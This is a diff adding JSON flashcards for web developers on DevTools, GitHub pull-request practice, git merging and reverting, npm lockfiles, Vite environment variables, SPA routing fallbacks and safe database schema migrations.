+    "answer": "**The new worker is installed, but the old one still controls the page.** It activates when every tab using the old worker closes, or when skipWaiting runs (a DevTools link or your app's update prompt). While developing, turn on Update on reload so each reload uses the latest worker."
+  },
+  {
+    "key": "app-devtools-computed-styles",
+    "deck": 7007,
+    "title": "Find the CSS rule that actually wins",
+    "aliases": [
+      "Computed tab",
+      "crossed out CSS"
+    ],
+    "question": "In the Elements panel a CSS declaration you wrote is crossed out. What does that mean, and where do you see the value that applies?",
+    "plain": "In the Styles tab, a crossed-out declaration was overridden by a rule that wins the cascade (higher specificity, later in the file, or !important). A crossed-out declaration with a warning icon is invalid instead. The Computed tab lists only the final value of each property, so it answers \"what color is this, really?\", and it lets you trace that value back to the rule that set it.",
+    "example": "```css\n/* <div class=\"card\"><h2 class=\"title title-danger\">…</h2></div> */\n.card .title { color: #333; }     /* specificity 0,2,0: wins */\n.title-danger { color: crimson; } /* 0,1,0: crossed out */\n```\nIn Chrome, getComputedStyle on the heading returned rgb(51, 51, 51), the #333 from .card .title, even though .title-danger comes later in the file.",
+    "analogy": "Several people leave sticky notes on your desk. Styles shows every note, including the ones that got overruled; Computed shows the one instruction you actually followed.",
+    "mistake": "Adding !important to force the crossed-out rule to win. First read which selector beats it; usually a slightly more specific selector or a fix to rule order is enough, and !important starts an arms race.",
+    "check": "You add justify-content: center to a plain div and the Styles tab shows it pale with an info icon, not crossed out. What is wrong?",
+    "answer": "**The declaration is inactive, not overridden.** It is valid but has no effect in this layout: justify-content only works on a flex or grid container, and the div is display: block. Hover the icon for the hint, then add display: flex to the div or move the rule to the real container."
+  },
+  {
+    "key": "app-devtools-device-mode",
+    "deck": 7007,
+    "title": "Know the limits of device mode",
+    "aliases": [
+      "chrome://inspect",
+      "remote debugging"
+    ],
+    "question": "What does Chrome's device mode simulate when you test a phone layout, and what can it not tell you?",
+    "plain": "Device mode sets a phone-sized viewport, device pixel ratio and user agent, emulates touch, and can throttle network and CPU. It is only a first approximation: your code still runs on your computer's CPU in desktop Chrome, so real-device speed, hardware quirks and other browsers such as Safari on iPhone go untested. For a real Android phone, use remote debugging through chrome://inspect.",
+    "example": "```css\n.toolbar { display: flex; gap: 8px; }\n@media (max-width: 600px) {\n  .toolbar { flex-direction: column; }\n}\n```\nIn Chrome at a narrow window width, getComputedStyle reported flex-direction: column; at 1200px it was row. Device mode is good for checks like this; whether taps and scrolling feel right on a cheap phone still needs the phone.",
+    "analogy": "Device mode is a flight simulator: excellent for learning the controls and checking the instruments, but it cannot prove how the real aircraft handles in turbulence.",
+    "mistake": "Marking a bug \"fixed on mobile\" after checking only device mode. Browsers on iPhone generally use Apple's WebKit engine, not the Chrome engine running your emulation, and a phone's CPU differs from your laptop's even with throttling.",
+    "check": "A menu bug happens only on a user's Android phone, and device mode looks fine. How can you open DevTools on the page running on that phone?",
+    "answer": "**Use remote debugging.** Turn on Developer options and USB debugging on the phone, connect it by USB, open chrome://inspect#devices in desktop Chrome, and click Inspect under the phone's tab. You get Elements, Console and Network for the real device; port forwarding lets the phone open your localhost dev server."
+  },
+  {
+    "key": "app-ship-closing-keywords",
+    "deck": 7008,
+    "title": "Close the issue from the PR description",
+    "aliases": [
+      "Fixes #",
+      "closing keywords",
+      "link issue"
+    ],
+    "question": "How do you make merging a pull request automatically close the GitHub issue it fixes?",
+    "plain": "Put a closing keyword and the issue number in the PR description, such as `Fixes #42` or `Closes #42`. GitHub links the PR to the issue and closes the issue when the PR is merged. The keywords are close, fix, and resolve (plus their -s and -d forms). It only works when the PR targets the default branch (usually `main`); a PR into a release branch closes nothing. A plain mention like `See #42` only cross-links.",
+    "example": "```text\nAdd due dates to tasks\n\nFixes #42\n\nWhat changed: nullable tasks.due_date column and a date input on the edit form.\n\nHow to test:\n1. Edit a task, pick tomorrow, save.\n2. Reload the page: the date is still shown.\n```\n\nMerging this PR into `main` closes issue #42 and lists the PR on the issue. The \"How to test\" steps let the reviewer check the change without guessing.",
+    "analogy": "It works like writing the ticket number on a repair invoice with \"fixes\": when the invoice is paid (the PR is merged), the ticket is closed for you. A note saying \"see ticket 42\" is only a reference and closes nothing.",
+    "mistake": "Writing `Fixes #42, #43` and expecting both issues to close. GitHub wants the keyword before each reference: `Fixes #42, fixes #43`. The other common miss is a PR that targets a non-default branch, where the keywords are ignored.",
+    "check": "Your PR into `main` says: \"Working on #88 and #91; fixes #88\". After it is merged, which of the two issues does GitHub close?",
+    "answer": "**Only #88.** It is the only reference that follows a closing keyword (`fixes`). The bare mention of #91 just cross-links that issue. To close #91 as well, add `fixes #91`: each issue needs its own keyword, and the PR must target the default branch."
+  },
+  {
+    "key": "app-ship-draft-pr",
+    "deck": 7008,
+    "title": "Open a draft PR for early feedback",
+    "aliases": [
+      "draft pull request",
+      "ready for review",
+      "WIP PR"
+    ],
+    "question": "When should you open a GitHub pull request as a draft, and what does draft status prevent?",
+    "plain": "Open a draft when the work is not ready to merge but you want CI to run or a teammate to check the direction early. A draft pull request cannot be merged, and code owners are not automatically asked to review it. When it is finished and you have read your own diff, mark it **Ready for review**; that requests code-owner reviews and tells everyone it is complete. You can turn a PR back into a draft at any time.",
+    "example": "```bash\n# API part is done, the empty-state UI is not\ngh pr create --draft --title \"Task list: empty and error states\" \\\n  --body \"API done. Still to do: empty-state UI.\"\n\n# later, after reading your own diff on GitHub\ngh pr ready\n```\n\n`gh pr create --draft` and `gh pr ready` are the GitHub CLI versions of the Draft option and the Ready for review button.",
+    "analogy": "A draft PR is like a document with \"DRAFT\" stamped across it: colleagues can comment on the direction, but nobody files it as final until you remove the stamp yourself.",
+    "mistake": "Opening a normal PR for half-finished work and writing \"WIP, do not merge\" in the title. Reviewers are requested right away, and someone can still click merge. Draft status is enforced by GitHub; a title is only a request.",
+    "check": "Your PR's API change is done, but the form still has a known bug. You want CI results and a quick opinion on the API shape today. How should you open the PR?",
+    "answer": "**As a draft pull request.** CI can run and you can ask one teammate for an early look, while GitHub blocks merging and does not auto-request code owners. Say in the description what is unfinished (the form bug), then mark it Ready for review once it is fixed and you have read your own diff."
+  },
+  {
+    "key": "app-ship-review-replies",
+    "deck": 7008,
+    "title": "Answer every review comment",
+    "aliases": [
+      "code review",
+      "respond to feedback",
+      "suggested changes"
+    ],
+    "question": "A reviewer leaves six comments on your pull request. How do you respond so their second review is quick?",
+    "plain": "Answer every comment with one of three things: the change you made and its commit (\"Renamed in 4f2c1a9\"), a short reason you disagree, or a follow-up issue for out-of-scope ideas. If they used GitHub's suggested-change feature, apply it with Commit suggestion (or batch several into one commit). Then re-request their review. Let the reviewer resolve threads where they asked a question, so nothing is closed before they agree.",
+    "example": "```text\nReviewer: `d` is not a clear name.\nYou:      Renamed to `dueDate` in 4f2c1a9.\n\nReviewer: Should this endpoint also accept PUT?\nYou:      Kept PATCH only: the form sends partial updates.\n\nReviewer: This list should be paginated too.\nYou:      Agreed, but it is out of scope here. Opened #57.\n```\n\nEach reply points to a commit, a reason, or a follow-up issue, so the reviewer can check it in seconds instead of re-reading the whole diff.",
+    "analogy": "It is like replying to an inspector's checklist: next to each item you write \"fixed, see photo\", \"not needed because…\", or \"booked for next week\". Any item left blank has to be inspected again from scratch.",
+    "mistake": "Pushing one big \"address review\" commit without replying to anything. The reviewer then has to work out which comments you handled, which you skipped, and which you disagreed with, so the second review takes as long as the first.",
+    "check": "A reviewer suggests replacing your 8-line date-formatting helper with a date library. You think the helper is fine for this PR. What reply would you leave?",
+    "answer": "**Disagree briefly, give the reason, offer a way forward.** For example: \"I kept the helper: it is 8 lines, tested, and only used by this screen. If we add more date logic I am happy to move to a library in a follow-up (#61).\" Leave the thread open so the reviewer can resolve it once they agree."
+  },
+  {
+    "key": "app-ship-squash-merge",
+    "deck": 7008,
+    "title": "Squash and merge makes one new commit",
+    "aliases": [
+      "squash merge",
+      "branch not fully merged"
+    ],
+    "question": "What does GitHub's \"Squash and merge\" put on `main`, and why can `git branch -d` then refuse to delete your local feature branch?",
+    "plain": "Squash and merge combines all of the PR's commits into one new commit on `main`. Your branch's original commits never become part of `main`'s history. `git branch -d` only deletes a branch that is merged into its upstream (or, with no upstream, into the current branch), so once the remote branch is deleted and pruned, Git finds those commits nowhere and says \"not fully merged\". After checking the PR is merged, use `git branch -D`.",
+    "example": "```bash\n# GitHub squash-merged PR #12 and deleted the remote branch\ngit switch main\ngit fetch --prune\ngit branch -d feature\n# error: the branch 'feature' is not fully merged\ngit branch -D feature   # fine: the PR shows as merged\n```\n\nReproduced with a local bare remote. While `origin/feature` still existed, `-d` deleted the branch with a warning; after the remote branch was deleted and pruned, it refused as shown.",
+    "analogy": "It is like retyping a notebook of drafts onto one clean page in the official file. The content is there, but the notebook pages are not, so a clerk checking \"is every notebook page filed?\" says no.",
+    "mistake": "Squash-merging a huge PR full of unrelated changes. It lands as one commit, so `git bisect` or `git revert` later can only point at the whole bundle. Squashing works best when each PR is already one focused change.",
+    "check": "Your team squash-merges PRs and GitHub deletes merged branches. A 7-commit PR is merged. How many new commits does `main` get, and after `git fetch --prune`, will `git branch -d` delete the branch?",
+    "answer": "**One commit, and no.** Squash and merge creates a single new commit holding the PR's combined changes. The 7 original commits are in neither `main`'s history nor a remote-tracking branch any more, so `git branch -d` reports \"not fully merged\". Confirm the PR is merged on GitHub, then use `git branch -D`."
+  },
+  {
+    "key": "app-ship-update-branch",
+    "deck": 7008,
+    "title": "Merge main in or rebase onto main",
+    "aliases": [
+      "update branch",
+      "behind main"
+    ],
+    "question": "Your PR branch is behind `main`. What is the difference between merging `main` into it and rebasing it onto `main`?",
+    "plain": "Merging `main` into your branch keeps your commits unchanged and adds one merge commit, so a normal `git push` works and anyone else on the branch is unaffected. Rebasing replays your commits on top of `main` as new commits with new hashes: the history is linear, but you must push with `--force-with-lease`, and anyone who already pulled the old commits now has copies that no longer match. Rebase branches only you push to; merge when others push to it too.",
+    "example": "```bash\ngit switch feature\ngit merge main       # \"feature work\" keeps its hash 39cb84f\ngit log --oneline --graph\n# *   ad62c83 Merge branch 'main' into feature\n# |\\\n# | * d5754c8 main moves\n# * | 39cb84f feature work\n# |/\n# * c6dbfef init\n\n# same starting point, rebased instead:\ngit rebase main      # \"feature work\" becomes 779e845\n```\n\nRun both ways from the same state: the merge kept the commit's hash, the rebase created a new commit.",
+    "analogy": "Merging is stapling today's updates to your report with a note \"brought up to date here\". Rebasing is rewriting the report as if you had started today: tidier, but anyone holding a copy of the old version now has one that does not match yours.",
+    "mistake": "Rebasing a branch a teammate has also pushed to, then force-pushing. Their commits can vanish from the branch and their local copy diverges. Check `git log origin/feature` for commits that are not yours first, or merge `main` instead.",
+    "check": "You and a teammate both push to `feature/export`. It is 20 commits behind `main`, and CI needs the latest `main`. Should you merge `main` in or rebase, and why?",
+    "answer": "**Merge `main` into it.** Merging leaves the commits both of you already have untouched and adds a single merge commit, so a plain `git push` works and your teammate can simply pull. Rebasing would rewrite commits your teammate already has and require a force-push that can drop their work."
+  },
+  {
+    "key": "app-ship-revert-merge",
+    "deck": 7008,
+    "title": "Revert a merged pull request",
+    "aliases": [
+      "git revert -m",
+      "undo merge"
+    ],
+    "question": "A merged PR broke production. How do you undo its merge commit on `main` with `git revert`, and why is `-m 1` needed?",
+    "plain": "Run `git revert -m 1 <merge-sha>` and push. A merge commit has two parents; `-m 1` tells Git to keep parent 1 (the `main` side) and undo what the merged branch added. Without it Git stops with \"is a merge but no -m option was given\". The revert is a new commit, so nobody has to force-push or rewrite history. On GitHub, the Revert button on a merged PR does the same thing by opening a new PR.",
+    "example": "```bash\ngit revert -m 1 133a21c --no-edit\n# [main 7651b29] Revert \"Merge pull request #7 from export-csv\"\nls\n# a.txt\n# readme.txt          (export.js is gone)\n\n# later: merge the same branch again\ngit merge export-csv\n# Already up to date.\n```\n\nThe last line matters: Git still sees the branch's commits in `main`'s history, so merging it again brings nothing back.",
+    "analogy": "A revert is a correction notice printed in the next edition, not a page torn out of copies already sold. Everyone's copy of the history still agrees; the newest page simply cancels the earlier one.",
+    "mistake": "Resetting `main` back past the merge and force-pushing. That rewrites shared history, breaks everyone's local `main`, and can drop commits merged after it. On a shared branch, undo by adding a revert commit.",
+    "check": "Last week you reverted merged PR #7 on `main`. The bug is now fixed on the same branch. Why does merging that branch again not bring the feature back, and what should you do?",
+    "answer": "**Its original commits are already in `main`'s history, so Git only merges the new fix.** The revert commit is what removed the code. Revert that revert commit (`git revert <revert-sha>`) to restore the feature, then merge the fix on top."
+  },
+  {
+    "key": "app-ship-npm-ci",
+    "deck": 7008,
+    "title": "Commit the lockfile with package.json",
+    "aliases": [
+      "package-lock.json",
+      "lockfile",
+      "clean install"
+    ],
+    "question": "`npm install dayjs` changed both `package.json` and `package-lock.json`. What does each file record, and why must both go into your pull request?",
+    "plain": "`package.json` records the range you accept (`\"dayjs\": \"^1.11.13\"`); `package-lock.json` records the exact version of every installed package, including dependencies of dependencies. CI and deploy builds run `npm ci`, which installs exactly the lockfile, deletes `node_modules` first, never writes either file, and fails if the two disagree. So commit both: without the lock change CI fails, and the lock diff shows reviewers exactly which versions changed.",
+    "example": "```bash\n# \"dayjs\": \"1.11.13\" was added to package.json by hand; the lock was not updated\nnpm ci\n# npm error `npm ci` can only install packages when your package.json\n#   and package-lock.json or npm-shrinkwrap.json are in sync. Please\n#   update your lock file with `npm install` before continuing.\n# npm error Missing: dayjs@1.11.13 from lock file\n\nnpm install   # updates package-lock.json; commit it with package.json\n```\n\nRun with npm 10 (the error is one long line, wrapped here). The failed `npm ci` left the lockfile unchanged.",
+    "analogy": "package.json is the recipe (\"flour, any 1.x bag\") and the lockfile is the exact receipt from the last shop. `npm ci` buys only what the receipt lists, so every cook ends up with the same items. `npm install` also follows the receipt and writes a new one only when the recipe changes, such as a new ingredient.",
+    "mistake": "Switching CI to `npm install` because `npm ci` failed. That hides an out-of-date lockfile, and CI then builds a dependency tree nobody reviewed. Run `npm install` locally, commit `package-lock.json`, and keep `npm ci` in CI.",
+    "check": "`package.json` has `\"ms\": \"^2.1.2\"`, the committed lockfile has ms 2.1.2, and ms 2.1.3 is now published. Which version does CI's `npm ci` install, and which does a teammate's fresh `npm install`?",
+    "answer": "**2.1.2 for both.** `npm ci` installs only what the lockfile says. `npm install` also follows the lockfile while it still satisfies `package.json`, so the `^` range alone does not upgrade anything. The version moves only when someone runs `npm update ms` (or `npm install ms@latest`), which rewrites the lockfile, and that diff should be reviewed like code."
+  },
+  {
+    "key": "app-ship-vite-env",
+    "deck": 7008,
+    "title": "VITE_ variables are public and build-time",
+    "aliases": [
+      "import.meta.env",
+      "environment variables",
+      ".env"
+    ],
+    "question": "In a Vite app, what happens to `import.meta.env.VITE_API_URL` during `vite build`, and who can read its value?",
+    "plain": "Vite replaces it with the literal value at build time, so the string ends up in the JavaScript bundle that every visitor downloads. Only variables prefixed `VITE_` are exposed this way; others, like `DATABASE_URL`, are `undefined` in client code. Two consequences: anything in a `VITE_` variable is public, so never put a secret there, and changing the value on the host later does nothing until you rebuild.",
+    "example": "```js\n// .env: VITE_API_URL=https://api.example.com\n//       DATABASE_URL=postgres://user:pw@db/app\nconsole.log(import.meta.env.VITE_API_URL);\nconsole.log(import.meta.env.DATABASE_URL);\n\n// dist/assets/index-*.js after `vite build` (minify off):\n// console.log(\"https://api.example.com\");\n// console.log(void 0);\n```\n\nBuilt with Vite 8: the URL is a plain string in the shipped file, and the unprefixed variable was not exposed.",
+    "analogy": "A `VITE_` variable is like text printed on a flyer before it is handed out: every reader can see it, and editing your notes afterwards does not change the flyers already printed. Only a reprint (a rebuild) updates them.",
+    "mistake": "Putting a payment or AI provider secret in `VITE_STRIPE_SECRET` because \"it is in .env, not in the code\". The build copies it into the bundle anyway. Secrets stay on a server; the browser calls your API, and the API uses the secret.",
+    "check": "A Vite app's `.env` defines `VITE_MAPS_KEY` and `API_SECRET`. After `vite build`, which of these reach the browser bundle: `VITE_MAPS_KEY`, `API_SECRET`, `import.meta.env.MODE`?",
+    "answer": "**`VITE_MAPS_KEY` and `MODE`.** `VITE_`-prefixed variables and built-ins like `MODE` (`\"production\"` for `vite build`) are replaced with literal strings. `API_SECRET` has no prefix, so `import.meta.env.API_SECRET` is `undefined` in client code. A key in the bundle must be one designed to be public."
+  },
+  {
+    "key": "app-ship-spa-fallback",
+    "deck": 7008,
+    "title": "Serve index.html for client routes",
+    "aliases": [
+      "SPA rewrite",
+      "history fallback",
+      "refresh 404"
+    ],
+    "question": "A React Router app opens `/notes/42` fine by clicking a link, but reloading that URL on the static host gives 404. Why, and what fixes it?",
+    "plain": "Clicking a link changes the URL inside the browser without asking the server. Reloading asks the server for `/notes/42`, and a static host has no file at that path, so it answers 404. Add a fallback rewrite that serves `index.html` with status 200 for paths that are not real files; the app loads and the router renders note 42. Real files such as `/assets/*.js` must still be served as themselves.",
+    "example": "```text\n# Netlify: public/_redirects (Vite copies it into dist/)\n/*    /index.html    200\n\n# Scratch Node server over the same dist/ folder:\n# no fallback:    GET /notes/42 -> 404\n# with fallback:  GET /notes/42 -> 200 text/html (index.html)\n```\n\nNetlify does not rewrite a path where a real file exists, so built JS still loads. Other hosts have the same idea under other names (Vercel `rewrites`, nginx `try_files`).",
+    "analogy": "It is like a building with one reception desk: whatever office number a visitor asks for, the front door sends them to reception (index.html), and reception walks them to the right room (the router). Without that rule the door says \"no such office\".",
+    "mistake": "Using a redirect to `/` instead of a 200 rewrite. The address bar changes to `/`, so the user lands on the home page and loses the note they reloaded. A rewrite keeps the URL and serves index.html's content.",
+    "check": "Fix a Netlify rule `/*  /  302` that sends every reload of `/notes/42` to the home page, so the note page still opens after a reload.",
+    "answer": "**Use a 200 rewrite to index.html: `/*  /index.html  200`.** A 302 is a redirect: the browser's URL changes to `/`, so the router renders the home page. A 200 rewrite serves index.html's content while the address bar keeps `/notes/42`, so React Router renders the note."
+  },
+  {
+    "key": "app-ship-expand-contract",
+    "deck": 7008,
+    "title": "Change the schema in safe steps",
+    "aliases": [
+      "expand and contract",
+      "migration order",
+      "rename column"
+    ],
+    "question": "You need to rename `users.name` to `full_name`. Why is one migration plus one code deploy risky, and what sequence is safe?",
+    "plain": "During a deploy, old and new code run side by side, and a rollback brings old code back, so every schema change must work with both. Expand, then contract: (1) a migration adds `full_name`, run before the new code; (2) deploy code that writes both columns but still reads `name`; (3) backfill `full_name` from `name`; (4) switch reads to `full_name`; (5) in a later release, stop writing `name` and drop it.",
+    "example": "```python\nimport sqlite3\ndb = sqlite3.connect(\":memory:\")\ndb.execute(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT NOT NULL)\")\nold_insert = \"INSERT INTO users (name) VALUES (?)\"  # old code, still running\n\ndb.execute(\"ALTER TABLE users RENAME COLUMN name TO full_name\")\ndb.execute(old_insert, (\"Grace\",))\n# sqlite3.OperationalError: table users has no column named name\n```\n\nWith the expand step instead (`ALTER TABLE users ADD COLUMN full_name TEXT`), the same old insert kept working. PostgreSQL breaks the same way after a one-step rename.",
+    "analogy": "It is like moving a shop: open the new address first, keep the old one open with a sign pointing to the new one, and close it only once customers have switched. Closing the old shop the day you open the new one strands people mid-trip.",
+    "mistake": "Running migrations after the new code already serves traffic. For a few minutes the new code queries a column that does not exist yet and returns 500s. Make the migration a separate deploy step that finishes before the new version takes requests.",
+    "check": "After adding `users.full_name` and deploying code that writes both columns, a teammate switches reads to `full_name` right away. Existing users now show a blank name. Why, and which step was skipped?",
+    "answer": "**The backfill.** A newly added column is NULL in every existing row; only new writes fill it. Copy the old values once no old code is still writing: `UPDATE users SET full_name = name WHERE full_name IS NULL`. Check that no NULLs remain, then switch reads to `full_name`."
+  }
+]
